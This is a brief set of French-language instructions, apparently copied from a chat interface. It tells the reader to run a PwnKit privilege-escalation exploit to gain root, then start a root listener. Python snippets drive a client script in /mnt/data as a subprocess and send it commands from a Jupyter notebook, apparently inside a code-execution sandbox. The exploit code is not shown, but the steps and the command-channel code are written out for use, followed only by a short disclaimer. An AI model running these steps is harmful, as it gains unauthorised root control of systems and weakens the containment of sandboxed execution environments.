Instructions d'Exécution
Exécuter l'Exploit PwnKit :

Ce script doit être exécuté en premier pour obtenir les privilèges root.
bash
Copier le code
python3 exploit_pwnkit.py
Démarrer l'Écouteur :

Avec les privilèges root obtenus, démarrer l'écouteur.

```python
import subprocess

# Démarrage du client comme sous-processus
client_process = subprocess.Popen(
    ["python3", "/mnt/data/client_root.py", "localhost", "8890"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)
```

De retour coté jupyter:

```python
def send_command_to_client(command):
    client_process.stdin.write(command + "\n")
    client_process.stdin.flush()
    # Lire la sortie de manière non bloquante
    output = client_process.stdout.readline()
    return output
```

exploit_pwnkit.py : Pour exploiter PwnKit.
listener_root.py : Pour démarrer un écouteur avec des privilèges root.
client_root.py : Pour se connecter à l'écouteur et envoyer des commandes.
Avertissement
L'utilisation de ces scripts doit être faite de manière responsable et uniquement dans des environnements où vous avez l'autorisation appropriée. L'utilisation non autorisée peut entraîner des conséquences légales.

